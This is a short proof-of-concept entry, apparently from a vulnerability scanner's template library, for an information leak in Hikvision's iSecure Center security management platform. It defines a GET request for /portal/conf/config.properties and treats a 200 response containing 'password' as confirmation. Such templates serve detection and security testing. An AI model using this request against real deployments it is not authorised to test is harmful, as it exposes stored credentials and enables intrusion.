{
        'name': '海康威视iSecure Center综合安防管理平台config.properties信息泄漏',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '/portal/conf/config.properties',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'password'
        }}]
    }